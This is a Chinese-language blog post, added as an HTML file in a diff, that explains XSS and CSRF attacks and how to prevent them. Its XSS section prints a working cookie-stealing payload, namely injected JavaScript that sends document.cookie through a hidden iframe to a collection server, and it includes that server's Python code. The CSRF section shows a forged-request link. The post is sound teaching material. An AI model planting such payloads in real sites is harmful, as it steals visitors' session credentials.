@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <title>XSS与CSRF两种跨站攻击 - yrong blog</title>
+  <meta property="og:title" content="XSS与CSRF两种跨站攻击 - yrong blog" />
+  <meta name="twitter:title" content="XSS与CSRF两种跨站攻击 - yrong blog" />
+  <meta name="description" content="XSS (Cross Site Script):脚本中的不速之客 XSS 全称“跨站脚本”。当然，名字只是为了跟css做区分，是注入攻击的一种。跟SQL注入不同的是，XSS不">
+  <meta property="og:description" content="XSS (Cross Site Script):脚本中的不速之客 XSS 全称“跨站脚本”。当然，名字只是为了跟css做区分，是注入攻击的一种。跟SQL注入不同的是，XSS不">
+  <meta name="twitter:description" content="XSS (Cross Site Script):脚本中的不速之客 XSS 全称“跨站脚本”。当然，名字只是为了跟css做区分，是注入攻击的一种。跟SQL注入不同的是，XSS不">
+  <meta name="author" content="Ronyang"/>
+  <meta property="og:site_name" content="yrong blog" />
+  <meta property="og:url" content="/blog/2016/10/23/xss-csrf/" />
+  <meta property="og:type" content="article" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="generator" content="Hugo 0.32-DEV" />
+  <link rel="stylesheet" href="/blog/css/style.css" media="all" />
+  <link rel="stylesheet" href="/blog/css/syntax.css" media="all" />
+  <link rel="stylesheet" href="/blog/css/custom.css" media="all" />
+  <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+</head>
+<body>
+
+<header class="site-header">
+  <nav class="site-navi">
+    <h1 class="site-title"><a href="/blog/">yrong blog</a></h1>
+    <ul class="site-navi-items">
+      <li class="site-navi-item-tags"><a href="/blog/tags/" title="Tags">Tags</a></li>
+      <li class="site-navi-item-archives"><a href="/blog/archives/" title="Archives">Archives</a></li>
+      <li class="site-navi-item-about"><a href="/blog/about/" title="About">About</a></li>
+    </ul>
+  </nav>
+</header>
+<hr class="site-header-bottom">
+
+  <div class="main" role="main">
+    <article class="article">
+      
+      
+      <h1 class="article-title">XSS与CSRF两种跨站攻击</h1>
+      
+      <hr class="article-title-bottom">
+      <ul class="article-meta">
+        <li class="article-meta-date"><time>October 23, 2016</time></li>
+        <li class="article-meta-tags">
+          <a href="/blog/tags/security/">
+            <svg class="icon"><use xlink:href="/blog/images/fa-solid.svg#tag"></use></svg>
+            security
+          </a>&nbsp;
+        </li>
+      </ul>
+      
+<aside class="toc">
+  <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#xss-cross-site-script-脚本中的不速之客">XSS (Cross Site Script):脚本中的不速之客</a>
+<ul>
+<li>
+<ul>
+<li><a href="#关键词">关键词</a></li>
+<li><a href="#描述">描述</a></li>
+<li><a href="#常见攻击方法">常见攻击方法</a></li>
+<li><a href="#预防">预防</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#csrf-cross-site-request-forgery-冒充用户">CSRF(Cross Site Request Forgery)：冒充用户</a>
+<ul>
+<li>
+<ul>
+<li><a href="#关键词-1">关键词</a></li>
+<li><a href="#描述-1">描述</a></li>
+<li><a href="#常见攻击">常见攻击</a></li>
+<li><a href="#预防-1">预防</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+</aside>
+      
+
+<h2 id="xss-cross-site-script-脚本中的不速之客">XSS (Cross Site Script):脚本中的不速之客</h2>
+
+<hr />
+
+<p>XSS 全称“跨站脚本”。当然，名字只是为了跟css做区分，是注入攻击的一种。跟SQL注入不同的是，XSS不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。而另外一种则是通过服务端的恶意程序，让用户点击以获取cookie里的身份认证信息</p>
+
+<h4 id="关键词">关键词</h4>
+
+<ul>
+<li>注入</li>
+<li>盗取</li>
+</ul>
+
+<h4 id="描述">描述</h4>
+
+<ul>
+<li>发布评论，提交含有JavaScript 的内容文本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</li>
+<li>用户已经登录或者为登录系统，但是重要信息保存的cookie里边，用户在点击某个网页的时候，恶意js盗取cookies等等信息，发送到服务器，如document.cookie</li>
+</ul>
+
+<h4 id="常见攻击方法">常见攻击方法</h4>
+
+<ul>
+<li>包含 JavaScript 脚本，如弹出恶意警告框：〈script〉alert(“XSS”);〈/script〉</li>
+<li>HTML代码段，譬如：网页不停地刷新 〈meta http-equiv=”refresh” content=”0;”〉</li>
+<li>HTML代码段，嵌入其它网站的链接 〈iframe src=<a href="http://xxxx">http://xxxx</a> width=250 height=250〉〈/iframe〉</li>
+<li>document.cookie，获取身份信息</li>
+<li>JavaScript eval()解析json的时候会执行内嵌的代码，一般使用JSON.parse()</li>
+</ul>
+
+<p>简单的恶作剧——一个关不掉的窗口：</p>
+
+<pre><code>while (true) {
+    alert(&quot;你关不掉我~&quot;);
+}
+</code></pre>
+
+<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
+
+<pre><code>#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+&quot;&quot;&quot;
+跨站脚本注入的信息收集服务器
+&quot;&quot;&quot;
+
+import bottle
+
+app = bottle.Bottle()
+plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
+app.install(plugin)
+
+@app.route('/myxss/')
+def show(cookies, db):
+    SQL = 'INSERT INTO &quot;myxss&quot; (&quot;cookies&quot;) VALUES (?)'
+    try:
+        db.execute(SQL, cookies)
+    except:
+        pass
+    return &quot;&quot;
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+</code></pre>
+
+<p>然后在某一个页面的评论中注入这段代码：</p>
+
+<pre><code>// 用 &lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 包起来放在评论中
+
+(function(window, document) {
+    // 构造泄露信息用的 URL
+    var cookies = document.cookie;
+    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // 建立隐藏 iframe 用于通讯
+    var hideFrame = document.createElement(&quot;iframe&quot;);
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = &quot;none&quot;;
+    hideFrame.src = xssURI;
+    // 开工
+    document.body.appendChild(hideFrame);
+})(window, document);
+</code></pre>
+
+<p>于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。</p>
+
+<h4 id="预防">预防</h4>
+
+<ul>
+<li>输入校验，代码过滤，特殊字符主要是“””，“’”，“&amp;”，“&lt;”，“&gt;”转义</li>
+</ul>
+
+<pre><code>以php为例，可以使用其内建函数进行代码过滤
+//清理空格
+$string = trim ( $string );
+//过滤html标签
+$string = strip_tags ( $string );
+//将字符内容转化为html实体
+$string = htmlspecialchars ( $string );
+
+&lt;?PHP
+function clean_xss(&amp;$string, $low = False)
+{
+    if (! is_array ( $string ))
+    {
+        //清理空格
+        $string = trim ( $string );
+        //过滤html标签
+        $string = strip_tags ( $string );
+        //将字符内容转化为html实体
+        $string = htmlspecialchars ( $string );
+        if ($low)
+        {
+            return True;
+        }
+        $string = str_replace ( array ('&quot;', &quot;\\&quot;, &quot;'&quot;, &quot;/&quot;, &quot;..&quot;, &quot;../&quot;, &quot;./&quot;, &quot;//&quot; ), '', $string );
+        $no = '/%0[0-8bcef]/';
+        $string = preg_replace ( $no, '', $string );
+        $no = '/%1[0-9a-f]/';
+        $string = preg_replace ( $no, '', $string );
+        $no = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S';
+        $string = preg_replace ( $no, '', $string );
+        return True;
+    }
+    $keys = array_keys ( $string );
+    foreach ( $keys as $key )
+    {
+        clean_xss ( $string [$key] );
+    }
+}
+//just a test
+$str = 'phpddt.com&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;';
+clean_xss($str); //如果你把这个注释掉，你就知道xss攻击的厉害了
+echo $str;
+?&gt;
+</code></pre>
+
+<p>使用模版引擎的 Web 项目中(Django Jinja2,Laravel Blade)，缺省会开启“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似</p>
+
+<pre><code>Hello, {!! $name !!}.
+</code></pre>
+
+<p>的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。</p>
+
+<p>附上一些“白名单”消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案：</p>
+
+<ul>
+<li>Python: <a href="http://lxml.de/lxmlhtml.html#cleaning-up-html">lxml.html.clean / bleach</a></li>
+<li>Ruby: <a href="https://github.com/rgrove/sanitize/">Sanitize</a></li>
+<li>JavaScript: <a href="https://github.com/punkave/sanitize-html">sanitize-html</a></li>
+<li>PHP: <a href="http://htmlpurifier.org/">htmlpurifier</a></li>
+</ul>
+
+<h2 id="csrf-cross-site-request-forgery-冒充用户">CSRF(Cross Site Request Forgery)：冒充用户</h2>
+
+<hr />
+
+<p>CSRF 的全称是“跨站请求伪造”。CSRF成功的前提用户必须登录到目标站点，且用户浏览了攻击者控制的站点。与XSS最为不同一点是CSRF可以不用JS就能达到目的（GET和POST的区别）。而且攻击者仅仅只需要给目标站一个请求就能成功，可以绕过同源策略。还有一个天然条件是浏览器的安全缺陷：浏览器在最初加入cookie功能时并没有考虑安全因素，存在隐式认证。即便是后期session的出现，也无法完全禁止cookie，例如sessionid就是记录在cookie里边的</p>
+
+<h4 id="关键词-1">关键词</h4>
+
+<ul>
+<li>冒充</li>
+</ul>
+
+<h4 id="描述-1">描述</h4>
+
+<ul>
+<li>用户已经登录，身份验证过了，验证信息保存在cookie里，方便的是不用经过反复验证，但是隐式认证也带来风险</li>
+<li>恶意请求伪造成用户请求，由于事先验证过，可能被当成用户请求，对系统发起篡改。</li>
+</ul>
+
+<h4 id="常见攻击">常见攻击</h4>
+
+<p>例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： <a href="http://example.com/bbs/create_post.php?title=标题&amp;content=内容">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</a> 那么，我只需要在论坛中发一帖，包含一链接： <a href="http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈</a> 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。</p>
+
+<h4 id="预防-1">预防</h4>
+
+<ul>
+<li><p>首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用REST 风格 <a href="http://zh.wikipedia.org/zh-cn/REST" title="Rest">1</a> 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除</p></li>
+
+<li><p>确认报头Referer来自正确网站，据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。虽然表头也是可以自定义的……</p></li>
+</ul>
+
+<pre><code>//eregi()功能：字符串比对解析，与大小写无关
+if(eregi(&quot;www.baidu.com&quot;, $_SERVER['HTTP_REFERER'])) {
+    //验证referer一致，执行代码
+} else {
+    echo &quot;Malicious Request!&quot;;
+}
+</code></pre>
+
+<ul>
+<li>比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。利用Token的唯一性在客户端服务器双向验证(form表单中加带上hidden的token域,server端验证token)</li>
+</ul>
+
+<pre><code>function token_check() {
+     // 检查session的Token是否存在
+     if (is_stoken()) {
+          // 检查Token是否发送过来
+          if(isset($_REQUEST[FTOKEN_NAME])) {
+               // 表单的Token和session的Token不一致
+               // 伪造请求
+               if($_REQUEST[FTOKEN_NAME] != $_SESSION[STOKEN_NAME]) {
+                    gen_error(1);
+                    destroy_stoken();
+                    exit();
+               } else {
+                       //端口成功验证
+                       //进行下一步的执行
+                    destroy_stoken();
+               }
+          // 伪造请求
+          } else {
+               gen_error(2);
+               destroy_stoken();
+               exit();
+          }
+     // 伪造请求
+     } else {
+          gen_error(3);
+          destroy_stoken();
+          exit();
+     }
+}
+</code></pre>
+
+    </article>
+
+    
+<ul class="article-share">
+  <li>
+    <a href="https://twitter.com/share" class="twitter-share-button">Tweet</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+  </li>
+  <li>
+    <div class="fb-share-button" data-href="https://yrong.github.io/blog/2016/10/23/xss-csrf/" data-layout="button_count" data-action="like" data-size="small" data-show-faces="true" data-share="true"></div>
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.10";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+  </li>
+  <li>
+    <script src="https://apis.google.com/js/platform.js" async defer></script>
+    <g:plus action="share"></g:plus>
+  </li>
+  <li>
+    <a href="http://b.hatena.ne.jp/entry/" class="hatena-bookmark-button" data-hatena-bookmark-layout="basic-label-counter" data-hatena-bookmark-lang="en" title="このエントリーをはてなブックマークに追加"><img src="https://b.st-hatena.com/images/entry-button/button-only@2x.png" alt="このエントリーをはてなブックマークに追加" width="20" height="20" style="border: none;" /></a><script src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>
+  </li>
+  <li>
+    <a data-pocket-label="pocket" data-pocket-count="horizontal" class="pocket-btn" data-lang="en"></a>
+    <script>!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+  </li>
+</ul>
+
+    <ul class="pager article-pager">
+      <li class="pager-newer">
+          <a href="/blog/2016/11/02/vimium/" data-toggle="tooltip" data-placement="top" title="chrome上的vim:vimium">&lt; Newer</a>
+      </li>
+      <li class="pager-older">
+        <a href="/blog/2016/10/21/jupyter/" data-toggle="tooltip" data-placement="top" title="程序员必备工具之Jupyter">Older &gt;</a>
+      </li>
+    </ul>
+  </div>
+
+
+<div class="site-footer">
+  <div class="copyright">&copy; Copyright 2017 Ronyang</div>
+  <ul class="site-footer-items">
+    <li class="site-footer-item-about"><a href="/blog/about/" title="About">About</a></li>
+  </ul>
+  <div class="powerdby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>
+  </div>
+</div>
+<script src="/blog/js/script.js"></script>
+<script src="/blog/js/custom.js"></script>
+
+
+</body>
+</html>
